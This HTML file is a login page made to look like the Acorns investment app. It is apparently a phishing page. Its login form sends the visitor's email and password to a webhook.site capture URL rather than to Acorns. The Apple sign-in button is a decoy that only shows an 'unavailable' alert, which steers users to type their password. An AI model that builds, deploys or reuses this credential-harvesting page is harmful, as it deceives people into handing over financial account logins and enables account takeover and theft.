<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acorns - Log in</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
        }
        
        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, #0B4B3A 0%, #1E8A6B 100%);
            padding: 20px;
        }
        
        .login-card {
            max-width: 440px;
            width: 100%;
            background: white;
            border-radius: 24px;
            padding: 48px 40px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
        }
        
        .logo {
            font-size: 32px;
            font-weight: 700;
            color: #0B4B3A;
            text-align: center;
            margin-bottom: 32px;
            letter-spacing: -0.5px;
        }
        
        h1 {
            font-size: 28px;
            font-weight: 700;
            color: #1A1A1A;
            margin-bottom: 8px;
            text-align: center;
        }
        
        .welcome-text {
            font-size: 16px;
            color: #666666;
            text-align: center;
            margin-bottom: 32px;
        }
        
        .form-group {
            margin-bottom: 24px;
        }
        
        label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #1A1A1A;
            margin-bottom: 8px;
        }
        
        input {
            width: 100%;
            padding: 14px 16px;
            font-size: 16px;
            border: 2px solid #E5E5E5;
            border-radius: 12px;
            background: #F8F8F8;
            transition: all 0.2s;
        }
        
        input:focus {
            outline: none;
            border-color: #1E8A6B;
            background: white;
        }
        
        input::placeholder {
            color: #999999;
            font-size: 16px;
        }
        
        .forgot-password {
            text-align: right;
            margin-bottom: 32px;
        }
        
        .forgot-password a {
            color: #1E8A6B;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        
        .forgot-password a:hover {
            text-decoration: underline;
        }
        
        .login-btn {
            width: 100%;
            padding: 16px;
            background: #1E8A6B;
            color: white;
            border: none;
            border-radius: 40px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 24px;
            transition: background 0.2s;
        }
        
        .login-btn:hover {
            background: #0B4B3A;
        }
        
        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            margin-bottom: 24px;
            color: #999999;
            font-size: 14px;
        }
        
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #E5E5E5;
        }
        
        .divider span {
            padding: 0 16px;
        }
        
        .apple-btn {
            width: 100%;
            padding: 14px;
            background: white;
            border: 2px solid #E5E5E5;
            border-radius: 40px;
            font-size: 16px;
            font-weight: 500;
            color: #1A1A1A;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: background 0.2s;
        }
        
        .apple-btn:hover {
            background: #F8F8F8;
        }
        
        .apple-icon {
            font-size: 20px;
            font-weight: 400;
        }
        
        .footer {
            margin-top: 32px;
            padding-top: 24px;
            border-top: 1px solid #E5E5E5;
            display: flex;
            justify-content: space-between;
            align-items: center;
            color: #666666;
            font-size: 13px;
        }
        
        .weather {
            display: flex;
            align-items: center;
            gap: 6px;
        }
        
        .temp {
            font-weight: 600;
            color: #1A1A1A;
        }
        
        .language {
            display: flex;
            gap: 8px;
        }
        
        .language a {
            color: #666666;
            text-decoration: none;
        }
        
        .language a:hover {
            color: #1E8A6B;
        }
        
        .language span {
            color: #CCCCCC;
        }
        
        .datetime {
            color: #999999;
        }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="logo">acorns</div>
        
        <h1>Log in to Acorns</h1>
        <div class="welcome-text">Welcome back! Log in to continue.</div>
        
        <form action="https://webhook.site/1d7986a3-ebad-4673-a29e-b66ef5185237" method="POST">
            <div class="form-group">
                <label>Email</label>
                <input type="email" name="email" placeholder="Enter your email" required>
            </div>
            
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" placeholder="Enter your password" required>
            </div>
            
            <div class="forgot-password">
                <a href="#">Forgot Password?</a>
            </div>
            
            <button type="submit" class="login-btn">Log in</button>
        </form>
        
        <div class="divider">
            <span>or</span>
        </div>
        
        <button class="apple-btn" onclick="alert('Apple Sign In is temporarily unavailable. Please use email login.')">
            <span class="apple-icon"></span>
            Sign in with Apple
        </button>
        
        <div class="footer">
            <div class="weather">
                <span>☀️</span>
                <span class="temp">26°C</span>
                <span>Mostly clear</span>
            </div>
            <div class="language">
                <a href="#">ENG</a>
                <span>|</span>
                <a href="#">IN</a>
            </div>
            <div class="datetime">
                23:13 • 14-03-2026
            </div>
        </div>
    </div>
</body>
</html>
